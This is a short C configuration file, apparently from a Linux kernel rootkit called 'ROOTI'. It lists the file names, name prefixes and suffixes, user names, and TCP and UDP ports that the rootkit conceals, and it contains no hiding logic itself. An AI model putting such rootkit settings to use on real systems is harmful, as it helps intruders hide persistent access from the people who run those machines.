#include "config.h"

/*
    Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the calculation
    to a constant variable because the linux macro includes some magic __must_be_array() term to catch invalid use
    of the macro, thus making the expression not constant.
*/
#define CONST_ARRAY_SIZE(ARR) sizeof(ARR) / sizeof(ARR[0])
#define DECLARE_ARRAY_SIZE(ARR) const size_t ARR##_COUNT = CONST_ARRAY_SIZE(ARR)

const char *ROOTI_HIDDEN_FILES[] = {
    "hideme.txt",
    "dontshowme.txt"
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES);

const char *ROOTI_HIDDEN_FILES_PREFIXES[] = {
    "secret",
    "classified"
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_PREFIXES);

const char *ROOTI_HIDDEN_FILES_SUFFIXES[] = {
    "secret",
    "classified"
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_SUFFIXES);

const char *ROOTI_HIDDEN_USERS[] = {
    "omri",
    "omre"
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_USERS);

const unsigned short ROOTI_HIDDEN_TCP_PORTS[] = {
    6060,
    7070
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_TCP_PORTS);

const unsigned short ROOTI_HIDDEN_UDP_PORTS[] = {
    8080,
    9090
};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_UDP_PORTS);
